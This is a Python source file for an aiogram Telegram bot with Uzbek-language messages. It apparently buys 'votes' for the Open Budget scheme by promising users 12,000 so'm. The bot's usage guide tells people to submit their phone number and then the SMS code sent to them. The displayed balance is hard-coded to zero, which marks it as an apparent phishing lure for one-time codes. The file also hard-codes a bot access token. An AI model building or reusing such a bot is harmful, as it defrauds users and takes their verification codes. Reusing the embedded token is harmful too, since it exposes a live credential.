import logging

from aiogram import Dispatcher, Bot, executor
from aiogram.types import *
from keyboard import start_btn, balance_btn, referal_btn


logging.basicConfig(level=logging.INFO)

BOT_TOKEN = "6251779786:AAG3lZJXf7u2-r7rBOW29ZhSiCbEL7ZF3zw"


bot = Bot(token=BOT_TOKEN, parse_mode='html')
dp = Dispatcher(bot=bot)


@dp.message_handler(commands=['start'])
async def start_handler(message: Message):
    btn = await start_btn()
    await message.answer("<b>Aziz foydalanuvchi siz oʻz ovozingizni berish orqali botdan 12000 so'm paynet sohibi boʼlishiz mumkin.</b>\n\n"
                        "<b>Unutmang sizning ovozingiz bizning mahallamiz obodonlashtirish uchun juda muhim.</b>\n\n"
                        "🚀<b> Botdan pul ishlash uchun telefon raqamingizni kiritishingiz kerak.</b>"
                        "<b>Telefon raqamingizni <code>+998901234567</code> shaklida yuboring.</b>", reply_markup=btn)
    

@dp.message_handler()
async def text_handler(message: Message):
    text = message.text

    if text == "🗳 Ovoz berish":
        await message.answer("📞<b> Ovoz berish uchun telefon raqamingizni kiriting:</b> \n\n"
                            "<b>Na'muna: +998991234567</b> \n\n"
                            "✅<b> Ovoz berish muvaffaqiyatli o'tganda, hisobingizga o'tkazib \n beriladigan summa: <i>12000 UZS</i> </b>")
        
    elif text == "💰 Balans":
        btn = await balance_btn()
        await message.answer("💰<b> Sizning hisobingiz:</b> <i> 0 so'm </i> \n"
                                "📥<b> Yechib olish uchun minimal summa:</b> <i> 5000 so'm </i> \n\n"
                                "📌 Pulingizni yechib olish uchun «💳<b> Yechib olish</b>» tugmasidan foydalaning.", reply_markup=btn)
        

    elif text == "🔗 Referal ssilka":
        btn = await referal_btn()
        album1 = MediaGroup()

        photo = InputFile("123.jpg")
        album1.attach_photo(photo=photo, caption=f"""🔗<b> Referallaringiz soni:</b> <i> 0 ta </i> </b>\n
<b>💸 Referal uchun to'lov:</b> <i> 5000 so'm </i> </b>\n\n
<i> Sizning referal ssilkangiz 👇🏻</i> \n
https://t.me/OpenBudgetgaOvoz_Bot?start={message.from_user.id}""")
        
        await message.answer_media_group(media=album1)


    elif text == "📝 Qo'llanma":
        album = MediaGroup()

        video = InputFile("1.mp4")
        album.attach_video(video=video, caption="""📌<b> Botdan foydalanish qo'llanmasi: </b> \n\n
1. «🗳<b> Ovoz berish </b>» knopkasini bosing va nomeringizni yozib \n qoldiring. \n\n
2. Bot sizga matemtik misol beradi shuni javobini botga yuboring \n misol uchun 2+3= shunaqa misol yuborsa 5 deb javobni o'zini \n yuborasiz. \n\n
3. Nomerizga sms kod keladi shuni botga yozb qoldiring va bot sizga \n <b> 12000 ming </b> so'm pul beradi. \n\n
Pulni nomerizga Paynet qilib yoki plastik raqamizga <b>«💰 Balans »</b> \n knopkasi orqali pulni yechib olishiz mumkun 🥳""")
        
        await message.answer_media_group(media=album)


    elif text == "💳 Yechib olish":
        await message.answer("<b>💳 Telefon yoki karta raqamingizni kiriting:</b>\n\n"
                            "⚠️ Bot Humans nomerga to'lov qilmaydi.\n\n"
                            "<b>📄 Na'muna:</b>\n"
                            "📱 Telefon raqam: <code>+998912345678</code>\n"
                            "💳 Karta raqam: <code>8600111122223333</code>")


    elif text == "🚫 Bekor qilish":
        btn = await start_btn()
        await message.answer("<b>Aziz foydalanuvchi siz oʻz ovozingizni berish orqali botdan 12000 so'm paynet sohibi boʼlishiz mumkin.</b>\n\n"
                            "<b>Unutmang sizning ovozingiz bizning mahallamiz obodonlashtirish uchun juda muhim.</b>\n\n"
                            "🚀<b> Botdan pul ishlash uchun telefon raqamingizni kiritishingiz kerak.</b>"
                            "<b>Telefon raqamingizni <code>+998901234567</code> shaklida yuboring.</b>", reply_markup=btn)




if __name__ == "__main__":
    executor.start_polling(dp)
